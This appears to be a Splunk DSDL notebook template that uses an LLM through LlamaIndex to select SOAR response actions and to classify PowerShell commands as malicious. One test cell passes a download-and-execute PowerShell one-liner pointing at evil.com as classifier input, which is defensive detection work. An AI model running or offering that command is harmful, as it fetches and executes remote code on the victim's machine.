{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# LLM Decision Making Script for DSDL-SOAR Integration"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "This notebook serves as the script of **LLM decision making** custom function on Splunk SOAR. It provides an example how DSDL can be integrated with SOAR."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Stage 0 - import libraries\n",
    "At stage 0 we define all imports necessary to run our subsequent code depending on various libraries."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "metadata": {
    "deletable": false,
    "name": "mltkc_import"
   },
   "outputs": [],
   "source": [
    "# this definition exposes all python module imports that should be available in all subsequent commands\n",
    "import json\n",
    "import numpy as np\n",
    "import pandas as pd\n",
    "import requests\n",
    "\n",
    "from llama_index.llms.azure_openai import AzureOpenAI\n",
    "from llama_index.core.prompts import ChatPromptTemplate\n",
    "from llama_index.core.llms import ChatMessage\n",
    "from llama_index.core.llms.structured_llm import StructuredLLM\n",
    "from app.model.llm_utils import create_llm, create_embedding_model\n",
    "from typing import List\n",
    "from pydantic import BaseModel, Field\n",
    "from llama_index.core.program import LLMTextCompletionProgram\n",
    "from llama_index.core.prompts import PromptTemplate\n",
    "from llama_index.core.output_parsers import PydanticOutputParser\n",
    "from llama_index.core.tools import ToolMetadata\n",
    "from llama_index.core.selectors import LLMSingleSelector\n",
    "from app.model.llm_utils import create_llm, create_embedding_model, create_vector_db\n",
    "# ...\n",
    "# global constants\n",
    "MODEL_DIRECTORY = \"/srv/app/model/data/\""
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Exampe 1: Use LLM as a tool selector"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 15,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Initializing LLM object from azure_openai\n",
      "Successfully created LLM object from azure_openai\n"
     ]
    }
   ],
   "source": [
    "# choices as a list of tool metadata\n",
    "choices = [\n",
    "    ToolMetadata(description=\"quarantine the server\", name=\"quarantine_tool\"),\n",
    "    ToolMetadata(description=\"update route table\", name=\"route_table_tool\"),\n",
    "]\n",
    "\n",
    "llm, m = create_llm(service=\"azure_openai\")\n",
    "print(m)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 17,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Decision: quarantine_tool\n",
      "Reason: The most relevant choice is to quarantine the server because it has been identified as compromised. Quarantining the server will help prevent further damage and contain the potential threat.\n"
     ]
    }
   ],
   "source": [
    "selector = LLMSingleSelector.from_defaults(llm=llm)\n",
    "selector_result = selector.select(\n",
    "    choices, query=\"We have identified a compromised server.\"\n",
    ")\n",
    "print(\"Decision: \" + choices[selector_result.selections[0].index].name)\n",
    "print(\"Reason: \" + selector_result.selections[0].reason)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 18,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Decision: route_table_tool\n",
      "Reason: Updating the route table can help resolve missing routing information.\n"
     ]
    }
   ],
   "source": [
    "selector = LLMSingleSelector.from_defaults(llm=llm)\n",
    "selector_result = selector.select(\n",
    "    choices, query=\"We have identified that some routing info are missing\"\n",
    ")\n",
    "print(\"Decision: \" + choices[selector_result.selections[0].index].name)\n",
    "print(\"Reason: \" + selector_result.selections[0].reason)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Example 2: Use LLM as a classifier"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "query = '''Is the following powershell command malicious?  \n",
    "get compute info'''\n",
    "bool_choices = [\n",
    "    ToolMetadata(description=\"The powershell command is malicious\", name=\"True\"),\n",
    "    ToolMetadata(description=\"The powershell command is benign\", name=\"False\"),\n",
    "]\n",
    "\n",
    "llm, m = create_llm(service=\"azure_openai\")\n",
    "print(m)\n",
    "\n",
    "bool_selector = LLMSingleSelector.from_defaults(llm=llm)\n",
    "bool_selector_result = bool_selector.select(\n",
    "    bool_choices, query=query\n",
    ")\n",
    "print(\"Decision: \" + bool_choices[bool_selector_result.selections[0].index].name)\n",
    "print(\"Reason: \" + bool_selector_result.selections[0].reason)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Stage 1 - get a data sample from Splunk\n",
    "In Splunk run a search to pipe a dataset into your notebook environment. Note: mode=stage is used in the | fit command to do this."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "metadata": {
    "deletable": false,
    "name": "mltkc_stage"
   },
   "outputs": [],
   "source": [
    "# this cell is not executed from MLTK and should only be used for staging data into the notebook environment\n",
    "def stage(name):\n",
    "    with open(\"data/\"+name+\".csv\", 'r') as f:\n",
    "        df = pd.read_csv(f)\n",
    "    with open(\"data/\"+name+\".json\", 'r') as f:\n",
    "        param = json.load(f)\n",
    "    return df, param"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "# THIS CELL IS NOT EXPORTED - free notebook cell for testing or development purposes\n",
    "df, param = stage(\"soar_llm_prompt_formatted\")\n",
    "print(df.describe())\n",
    "print(param)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Stage 2 - create and initialize a model"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "deletable": false,
    "name": "mltkc_init"
   },
   "outputs": [],
   "source": [
    "# initialize your model\n",
    "# available inputs: data and parameters\n",
    "# returns the model object which will be used as a reference to call fit, apply and summary subsequently\n",
    "def init(df,param):\n",
    "    model = {}\n",
    "    model['hyperparameter'] = 42.0\n",
    "    return model"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "scrolled": true
   },
   "outputs": [],
   "source": [
    "# THIS CELL IS NOT EXPORTED - free notebook cell for testing or development purposes\n",
    "print(init(df,param))"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Stage 3 - fit the model"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "deletable": false,
    "name": "mltkc_fit"
   },
   "outputs": [],
   "source": [
    "# train your model\n",
    "# returns a fit info json object and may modify the model object\n",
    "def fit(model,df,param):\n",
    "    # model.fit()\n",
    "    info = {\"message\": \"model trained\"}\n",
    "    return info"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "# THIS CELL IS NOT EXPORTED - free notebook cell for testing or development purposes\n",
    "print(fit(model,df,param))"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Stage 4 - apply the model"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "metadata": {
    "deletable": false,
    "name": "mltkc_apply"
   },
   "outputs": [],
   "source": [
    "def apply(model,df,param):\n",
    "    try:\n",
    "        llm_service = param['options']['params']['llm_service'].strip(\"\\\"\")\n",
    "        print(f\"Using {llm_service} LLM service.\")\n",
    "    except:\n",
    "        llm_service = \"ollama\"\n",
    "        print(\"Using default Ollama LLM service.\")\n",
    "\n",
    "    if llm_service == \"ollama\": \n",
    "        try:\n",
    "            model_name = param['options']['params']['model_name'].strip(\"\\\"\")\n",
    "        except:\n",
    "            returns=pd.DataFrame({\"decision\": [None], \"reason\": [\"ERROR: Please specify model_name input for using Ollama LLMs\"]})\n",
    "            return returns \n",
    "        llm, m = create_llm(service='ollama', model=model_name)\n",
    "    else:\n",
    "        llm, m = create_llm(service=llm_service)\n",
    "    \n",
    "    try:\n",
    "        prompt = param['options']['params']['prompt'].strip(\"\\\"\")\n",
    "        context = param['options']['params']['context'].strip(\"\\\"\")\n",
    "    except:\n",
    "        returns=pd.DataFrame({\"decision\": [None], \"reason\": [\"ERROR: Please specify prompt and context inputs\"]})\n",
    "        return returns \n",
    "\n",
    "    query = f'''{prompt}\n",
    "    ----------------------\n",
    "    {context}\n",
    "    '''\n",
    "    \n",
    "    try:\n",
    "        labels = json.loads(param['options']['params']['labels'])\n",
    "        descriptions = json.loads(param['options']['params']['descriptions'])\n",
    "        assert len(labels) == len(descriptions)\n",
    "    except Exception as e:\n",
    "        returns=pd.DataFrame({\"decision\": [None], \"reason\": [f\"ERROR loading labels and descriptions: {e}\"]})\n",
    "        return returns\n",
    "\n",
    "    choices = []\n",
    "\n",
    "    for i in range(len(labels)):\n",
    "        choices.append(ToolMetadata(description=descriptions[i], name=labels[i]))\n",
    "\n",
    "    selector = LLMSingleSelector.from_defaults(llm=llm)\n",
    "    try:\n",
    "        selector_result = selector.select(\n",
    "            choices, query=query\n",
    "        )\n",
    "        decision = choices[selector_result.selections[0].index].name\n",
    "        reason = selector_result.selections[0].reason\n",
    "        returns=pd.DataFrame({\"decision\": [decision], \"reason\": [reason]})\n",
    "        return returns\n",
    "    except Exception as e:\n",
    "        returns=pd.DataFrame({\"decision\": [None], \"reason\": [f\"ERROR receiving response from LLM: {e}\"]})\n",
    "        return returns"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Initializing LLM object from ollama\n"
     ]
    },
    {
     "data": {
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>is_positive</th>\n",
       "      <th>reason</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>0</th>\n",
       "      <td>True</td>\n",
       "      <td>The PowerShell command uses `Invoke-Expression...</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "</div>"
      ],
      "text/plain": [
       "   is_positive                                             reason\n",
       "0         True  The PowerShell command uses `Invoke-Expression..."
      ]
     },
     "execution_count": 4,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "param = {'options':{'params':{'prompt': \"Is the following powershell command malicious?\", \"query\":\"IEX (New-Object Net.WebClient).DownloadString(htttp://evil.com/malware.ps1)\"}}}\n",
    "\n",
    "a = apply(None, None, param)\n",
    "a"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "# THIS CELL IS NOT EXPORTED - free notebook cell for testing or development purposes\n",
    "print(apply(model,df,param))"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Stage 5 - save the model"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "deletable": false,
    "name": "mltkc_save"
   },
   "outputs": [],
   "source": [
    "# save model to name in expected convention \"<algo_name>_<model_name>\"\n",
    "def save(model,name):\n",
    "    with open(MODEL_DIRECTORY + name + \".json\", 'w') as file:\n",
    "        json.dump(model, file)\n",
    "    return model"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Stage 6 - load the model"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "deletable": false,
    "name": "mltkc_load"
   },
   "outputs": [],
   "source": [
    "# load model from name in expected convention \"<algo_name>_<model_name>\"\n",
    "def load(name):\n",
    "    model = {}\n",
    "    with open(MODEL_DIRECTORY + name + \".json\", 'r') as file:\n",
    "        model = json.load(file)\n",
    "    return model"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Stage 7 - provide a summary of the model"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 21,
   "metadata": {
    "deletable": false,
    "name": "mltkc_summary"
   },
   "outputs": [],
   "source": [
    "# return a model summary\n",
    "def summary(model=None):\n",
    "    returns = {\"version\": {\"numpy\": np.__version__, \"pandas\": pd.__version__} }\n",
    "    return returns"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3 (ipykernel)",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.9.21"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 4
}
